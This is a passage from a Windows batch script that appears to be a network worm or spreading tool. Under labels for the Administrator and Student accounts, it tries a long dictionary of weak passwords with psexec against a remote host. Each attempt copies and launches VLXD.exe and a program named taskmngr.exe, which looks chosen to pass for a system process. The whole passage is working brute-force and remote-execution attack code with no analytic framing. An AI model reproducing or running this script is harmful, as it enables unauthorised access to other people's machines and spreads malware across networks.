   psexec \\%1 -u Administrator -p "pussy" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "pussy" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "pussy" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "pussy" -d taskmngr.exe
   goto end
   :Administratorcock
   psexec \\%1 -u Administrator -p "cock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "cock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "cock" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "cock" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "cock" -d taskmngr.exe
   goto end
   :Administratordick
   psexec \\%1 -u Administrator -p "dick" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "dick" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "dick" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "dick" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "dick" -d taskmngr.exe
   psexec \\%1 -u Administrator -p dick -c -f -d VLXD.exe
   goto end
   :Administratorshithead
   psexec \\%1 -u Administrator -p "shithead" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "shithead" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "shithead" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "shithead" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "shithead" -d taskmngr.exe
   goto end
   :Administratorshotgun
   psexec \\%1 -u Administrator -p "shotgun" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "shotgun" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "shotgun" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "shotgun" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "shotgun" -d taskmngr.exe
   goto end
   :Administratorblunt
   psexec \\%1 -u Administrator -p "blunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "blunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "blunt" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "blunt" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "blunt" -d taskmngr.exe
   goto end
   :Administratorglock
   psexec \\%1 -u Administrator -p "glock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "glock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "glock" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "glock" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "glock" -d taskmngr.exe
   goto end
   :Administratorexecutable
   psexec \\%1 -u Administrator -p "executable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "executable" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "executable" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "executable" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "executable" -d taskmngr.exe
   goto end
   :Administratorbong
   psexec \\%1 -u Administrator -p "bong" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "bong" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "bong" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "bong" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "bong" -d taskmngr.exe
   goto end
   :Administratordildo
   psexec \\%1 -u Administrator -p "dildo" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "dildo" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "dildo" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "dildo" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "dildo" -d taskmngr.exe
   goto end
   :Administratorbaseball
   psexec \\%1 -u Administrator -p "baseball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "baseball" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "baseball" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "baseball" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "baseball" -d taskmngr.exe
   goto end
   :Administratorbasketball
   psexec \\%1 -u Administrator -p "basketball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "basketball" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "basketball" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "basketball" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "basketball" -d taskmngr.exe
   goto end
   :Administratorfootball
   psexec \\%1 -u Administrator -p "football" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "football" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "football" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "football" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "football" -d taskmngr.exe
   goto end
   :Administratorsoccer
   psexec \\%1 -u Administrator -p "soccer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "soccer" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "soccer" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "soccer" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "soccer" -d taskmngr.exe
   goto end
   :Administratorpot
   psexec \\%1 -u Administrator -p "pot" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "pot" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "pot" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "pot" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "pot" -d taskmngr.exe
   goto end
   :Administratordope
   psexec \\%1 -u Administrator -p "dope" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "dope" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "dope" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "dope" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "dope" -d taskmngr.exe
   goto end
   :Administratormaryjane
   psexec \\%1 -u Administrator -p "maryjane" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "maryjane" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "maryjane" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "maryjane" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "maryjane" -d taskmngr.exe
   goto end
   :Administratormarijuana
   psexec \\%1 -u Administrator -p "marijuana" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "marijuana" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "marijuana" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "marijuana" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "marijuana" -d taskmngr.exe
   goto end
   :Administratormoney
   psexec \\%1 -u Administrator -p "money" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "money" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "money" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "money" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "money" -d taskmngr.exe
   goto end
   :Administratorgirl
   psexec \\%1 -u Administrator -p "girl" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "girl" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "girl" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "girl" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "girl" -d taskmngr.exe
   goto end
   :Administratorgirls
   psexec \\%1 -u Administrator -p "girls" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "girls" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "girls" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "girls" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "girls" -d taskmngr.exe
   goto end
   :Administratorwoman
   psexec \\%1 -u Administrator -p "woman" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "woman" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "woman" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "woman" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "woman" -d taskmngr.exe
   goto end
   :Administratorwomen
   psexec \\%1 -u Administrator -p "women" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "women" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "women" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "women" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "women" -d taskmngr.exe
   goto end
   :Administratorfemale
   psexec \\%1 -u Administrator -p "female" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "female" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "female" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "female" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "female" -d taskmngr.exe
   goto end
   :Administratoramerica
   psexec \\%1 -u Administrator -p "america" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "america" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "america" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "america" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "america" -d taskmngr.exe
   goto end
   :Administratorusa
   psexec \\%1 -u Administrator -p "usa" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "usa" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "usa" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "usa" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "usa" -d taskmngr.exe
   goto end
   :Administratorgod
   psexec \\%1 -u Administrator -p "god" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "god" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "god" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "god" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "god" -d taskmngr.exe
   goto end
   :Administratorjesus
   psexec \\%1 -u Administrator -p "jesus" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "jesus" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "jesus" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "jesus" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "jesus" -d taskmngr.exe
   goto end
   :Administratorcomputer
   psexec \\%1 -u Administrator -p "computer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "computer" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "computer" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "computer" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "computer" -d taskmngr.exe
   goto end
   :Administratortechnology
   psexec \\%1 -u Administrator -p "technology" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "technology" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "technology" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "technology" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "technology" -d taskmngr.exe
   goto end
   :Administratorporn
   psexec \\%1 -u Administrator -p "porn" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "porn" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "porn" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "porn" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "porn" -d taskmngr.exe
   goto end
   :Administratorhack
   psexec \\%1 -u Administrator -p "hack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "hack" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "hack" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "hack" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "hack" -d taskmngr.exe
   goto end
   :Administratorclock
   psexec \\%1 -u Administrator -p "clock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "clock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "clock" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "clock" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "clock" -d taskmngr.exe
   goto end
   :Administratorchurch
   psexec \\%1 -u Administrator -p "church" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "church" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "church" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "church" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "church" -d taskmngr.exe
   goto end
   :Administratortemp
   psexec \\%1 -u Administrator -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Administrator -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "temp" -d taskmngr.exe
   psexec \\%1 -u Administrator -p "temp" -d VLXD.exe -o
   psexec \\%1 -u Administrator -p "temp" -d taskmngr.exe
   goto end
   :Student
   psexec \\%1 -u Student -p "" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "" -d taskmngr.exe
   psexec \\%1 -u Student -p "" -d VLXD.exe -o
   psexec \\%1 -u Student -p "" -d taskmngr.exe
   goto end
   :Studentpass123
   psexec \\%1 -u Student -p "pass123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "pass123" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "pass123" -d taskmngr.exe
   psexec \\%1 -u Student -p "pass123" -d VLXD.exe -o
   psexec \\%1 -u Student -p "pass123" -d taskmngr.exe
   goto end
   :Studentsomething
   psexec \\%1 -u Student -p "something" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "something" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "something" -d taskmngr.exe
   psexec \\%1 -u Student -p "something" -d VLXD.exe -o
   psexec \\%1 -u Student -p "something" -d taskmngr.exe
   goto end
   :Studentmypass
   psexec \\%1 -u Student -p "mypass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "mypass" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "mypass" -d taskmngr.exe
   psexec \\%1 -u Student -p "mypass" -d VLXD.exe -o
   psexec \\%1 -u Student -p "mypass" -d taskmngr.exe
   goto end
   :Studentlogin
   psexec \\%1 -u Student -p "login" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "login" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "login" -d taskmngr.exe
   psexec \\%1 -u Student -p "login" -d VLXD.exe -o
   psexec \\%1 -u Student -p "login" -d taskmngr.exe
   goto end
   :Studentaccess
   psexec \\%1 -u Student -p "access" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "access" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "access" -d taskmngr.exe
   psexec \\%1 -u Student -p "access" -d VLXD.exe -o
   psexec \\%1 -u Student -p "access" -d taskmngr.exe
   goto end
   :Studentpassword
   psexec \\%1 -u Student -p "password" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "password" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "password" -d taskmngr.exe
   psexec \\%1 -u Student -p "password" -d VLXD.exe -o
   psexec \\%1 -u Student -p "password" -d taskmngr.exe
   goto end
   :Studentmatrix
   psexec \\%1 -u Student -p "matrix" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "matrix" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "matrix" -d taskmngr.exe
   psexec \\%1 -u Student -p "matrix" -d VLXD.exe -o
   psexec \\%1 -u Student -p "matrix" -d taskmngr.exe
   goto end
   :Studentsecurity
   psexec \\%1 -u Student -p "security" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "security" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "security" -d taskmngr.exe
   psexec \\%1 -u Student -p "security" -d VLXD.exe -o
   psexec \\%1 -u Student -p "security" -d taskmngr.exe
   goto end
   :Studentsuccess
   psexec \\%1 -u Student -p "success" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "success" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "success" -d taskmngr.exe
   psexec \\%1 -u Student -p "success" -d VLXD.exe -o
   psexec \\%1 -u Student -p "success" -d taskmngr.exe
   goto end
   :Studentspecial
   psexec \\%1 -u Student -p "special" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "special" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "special" -d taskmngr.exe
   psexec \\%1 -u Student -p "special" -d VLXD.exe -o
   psexec \\%1 -u Student -p "special" -d taskmngr.exe
   goto end
   :Studentultra
   psexec \\%1 -u Student -p "ultra" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "ultra" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "ultra" -d taskmngr.exe
   psexec \\%1 -u Student -p "ultra" -d VLXD.exe -o
   psexec \\%1 -u Student -p "ultra" -d taskmngr.exe
   goto end
   :Studentpass
   psexec \\%1 -u Student -p "pass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "pass" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "pass" -d taskmngr.exe
   psexec \\%1 -u Student -p "pass" -d VLXD.exe -o
   psexec \\%1 -u Student -p "pass" -d taskmngr.exe
   goto end
   :Studentenable
   psexec \\%1 -u Student -p "enable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "enable" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "enable" -d taskmngr.exe
   psexec \\%1 -u Student -p "enable" -d VLXD.exe -o
   psexec \\%1 -u Student -p "enable" -d taskmngr.exe
   goto end
   :Studentpasswd
   psexec \\%1 -u Student -p "passwd" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "passwd" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "passwd" -d taskmngr.exe
   psexec \\%1 -u Student -p "passwd" -d VLXD.exe -o
   psexec \\%1 -u Student -p "passwd" -d taskmngr.exe
   goto end
   :Studentinternet
   psexec \\%1 -u Student -p "internet" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "internet" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "internet" -d taskmngr.exe
   psexec \\%1 -u Student -p "internet" -d VLXD.exe -o
   psexec \\%1 -u Student -p "internet" -d taskmngr.exe
   goto end
   :Studentnetwork
   psexec \\%1 -u Student -p "network" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "network" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "network" -d taskmngr.exe
   psexec \\%1 -u Student -p "network" -d VLXD.exe -o
   psexec \\%1 -u Student -p "network" -d taskmngr.exe
   goto end
   :Studentedu
   psexec \\%1 -u Student -p "edu" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "edu" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "edu" -d taskmngr.exe
   psexec \\%1 -u Student -p "edu" -d VLXD.exe -o
   psexec \\%1 -u Student -p "edu" -d taskmngr.exe
   goto end
   :Studentowner
   psexec \\%1 -u Student -p "owner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "owner" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "owner" -d taskmngr.exe
   psexec \\%1 -u Student -p "owner" -d VLXD.exe -o
   psexec \\%1 -u Student -p "owner" -d taskmngr.exe
   goto end
   :Studentlocal
   psexec \\%1 -u Student -p "local" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "local" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "local" -d taskmngr.exe
   psexec \\%1 -u Student -p "local" -d VLXD.exe -o
   psexec \\%1 -u Student -p "local" -d taskmngr.exe
   goto end
   :Studentremote
   psexec \\%1 -u Student -p "remote" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "remote" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "remote" -d taskmngr.exe
   psexec \\%1 -u Student -p "remote" -d VLXD.exe -o
   psexec \\%1 -u Student -p "remote" -d taskmngr.exe
   goto end
   :Studentlan
   psexec \\%1 -u Student -p "lan" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "lan" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "lan" -d taskmngr.exe
   psexec \\%1 -u Student -p "lan" -d VLXD.exe -o
   psexec \\%1 -u Student -p "lan" -d taskmngr.exe
   goto end
   :Studentroot
   psexec \\%1 -u Student -p "root" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "root" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "root" -d taskmngr.exe
   psexec \\%1 -u Student -p "root" -d VLXD.exe -o
   psexec \\%1 -u Student -p "root" -d taskmngr.exe
   goto end
   :Studentbitch
   psexec \\%1 -u Student -p "bitch" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "bitch" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "bitch" -d taskmngr.exe
   psexec \\%1 -u Student -p "bitch" -d VLXD.exe -o
   psexec \\%1 -u Student -p "bitch" -d taskmngr.exe
   goto end
   :Studentfault
   psexec \\%1 -u Student -p "fault" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "fault" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "fault" -d taskmngr.exe
   psexec \\%1 -u Student -p "fault" -d VLXD.exe -o
   psexec \\%1 -u Student -p "fault" -d taskmngr.exe
   goto end
   :Studentcat
   psexec \\%1 -u Student -p "cat" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "cat" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "cat" -d taskmngr.exe
   psexec \\%1 -u Student -p "cat" -d VLXD.exe -o
   psexec \\%1 -u Student -p "cat" -d taskmngr.exe
   goto end
   :Student911
   psexec \\%1 -u Student -p "911" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "911" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "911" -d taskmngr.exe
   psexec \\%1 -u Student -p "911" -d VLXD.exe -o
   psexec \\%1 -u Student -p "911" -d taskmngr.exe
   goto end
   :Studenttowers
   psexec \\%1 -u Student -p "towers" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "towers" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "towers" -d taskmngr.exe
   psexec \\%1 -u Student -p "towers" -d VLXD.exe -o
   psexec \\%1 -u Student -p "towers" -d taskmngr.exe
   goto end
   :Student123
   psexec \\%1 -u Student -p "123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "123" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "123" -d taskmngr.exe
   psexec \\%1 -u Student -p "123" -d VLXD.exe -o
   psexec \\%1 -u Student -p "123" -d taskmngr.exe
   goto end
   :Student1234
   psexec \\%1 -u Student -p "1234" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "1234" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "1234" -d taskmngr.exe
   psexec \\%1 -u Student -p "1234" -d VLXD.exe -o
   psexec \\%1 -u Student -p "1234" -d taskmngr.exe
   goto end
   :Student12345
   psexec \\%1 -u Student -p "12345" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "12345" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "12345" -d taskmngr.exe
   psexec \\%1 -u Student -p "12345" -d VLXD.exe -o
   psexec \\%1 -u Student -p "12345" -d taskmngr.exe
   goto end
   :Student123456
   psexec \\%1 -u Student -p "123456" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "123456" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "123456" -d taskmngr.exe
   psexec \\%1 -u Student -p "123456" -d VLXD.exe -o
   psexec \\%1 -u Student -p "123456" -d taskmngr.exe
   goto end
   :Student654321
   psexec \\%1 -u Student -p "654321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "654321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "654321" -d taskmngr.exe
   psexec \\%1 -u Student -p "654321" -d VLXD.exe -o
   psexec \\%1 -u Student -p "654321" -d taskmngr.exe
   goto end
   :Student54321
   psexec \\%1 -u Student -p "54321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "54321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "54321" -d taskmngr.exe
   psexec \\%1 -u Student -p "54321" -d VLXD.exe -o
   psexec \\%1 -u Student -p "54321" -d taskmngr.exe
   goto end
   :Student321
   psexec \\%1 -u Student -p "321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "321" -d taskmngr.exe
   psexec \\%1 -u Student -p "321" -d VLXD.exe -o
   psexec \\%1 -u Student -p "321" -d taskmngr.exe
   goto end
   :StudentStudent
   psexec \\%1 -u Student -p "Student" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "Student" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "Student" -d taskmngr.exe
   psexec \\%1 -u Student -p "Student" -d VLXD.exe -o
   psexec \\%1 -u Student -p "Student" -d taskmngr.exe
   goto end
   :Student4321
   psexec \\%1 -u Student -p "4321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "4321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "4321" -d taskmngr.exe
   psexec \\%1 -u Student -p "4321" -d VLXD.exe -o
   psexec \\%1 -u Student -p "4321" -d taskmngr.exe
   goto end
   :Studenttemp
   psexec \\%1 -u Student -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "temp" -d taskmngr.exe
   psexec \\%1 -u Student -p "temp" -d VLXD.exe -o
   psexec \\%1 -u Student -p "temp" -d taskmngr.exe
   goto end
   :Studentuser
   psexec \\%1 -u Student -p "user" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "user" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "user" -d taskmngr.exe
   psexec \\%1 -u Student -p "user" -d VLXD.exe -o
   psexec \\%1 -u Student -p "user" -d taskmngr.exe
   goto end
   :Studentbootie
   psexec \\%1 -u Student -p "bootie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "bootie" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "bootie" -d taskmngr.exe
   psexec \\%1 -u Student -p "bootie" -d VLXD.exe -o
   psexec \\%1 -u Student -p "bootie" -d taskmngr.exe
   goto end
   :Studentpoop
   psexec \\%1 -u Student -p "poop" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "poop" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "poop" -d taskmngr.exe
   psexec \\%1 -u Student -p "poop" -d VLXD.exe -o
   psexec \\%1 -u Student -p "poop" -d taskmngr.exe
   goto end
   :Studentpoopie
   psexec \\%1 -u Student -p "poopie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "poopie" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "poopie" -d taskmngr.exe
   psexec \\%1 -u Student -p "poopie" -d VLXD.exe -o
   psexec \\%1 -u Student -p "poopie" -d taskmngr.exe
   goto end
   :Studentweed
   psexec \\%1 -u Student -p "weed" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "weed" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "weed" -d taskmngr.exe
   psexec \\%1 -u Student -p "weed" -d VLXD.exe -o
   psexec \\%1 -u Student -p "weed" -d taskmngr.exe
   goto end
   :Studentwater
   psexec \\%1 -u Student -p "water" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "water" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "water" -d taskmngr.exe
   psexec \\%1 -u Student -p "water" -d VLXD.exe -o
   psexec \\%1 -u Student -p "water" -d taskmngr.exe
   goto end
   :Studentcool
   psexec \\%1 -u Student -p "cool" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "cool" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "cool" -d taskmngr.exe
   psexec \\%1 -u Student -p "cool" -d VLXD.exe -o
   psexec \\%1 -u Student -p "cool" -d taskmngr.exe
   goto end
   :Studentjoint
   psexec \\%1 -u Student -p "joint" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "joint" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "joint" -d taskmngr.exe
   psexec \\%1 -u Student -p "joint" -d VLXD.exe -o
   psexec \\%1 -u Student -p "joint" -d taskmngr.exe
   goto end
   :Studentcrack
   psexec \\%1 -u Student -p "crack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "crack" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "crack" -d taskmngr.exe
   psexec \\%1 -u Student -p "crack" -d VLXD.exe -o
   psexec \\%1 -u Student -p "crack" -d taskmngr.exe
   goto end
   :Studentdanger
   psexec \\%1 -u Student -p "danger" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "danger" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "danger" -d taskmngr.exe
   psexec \\%1 -u Student -p "danger" -d VLXD.exe -o
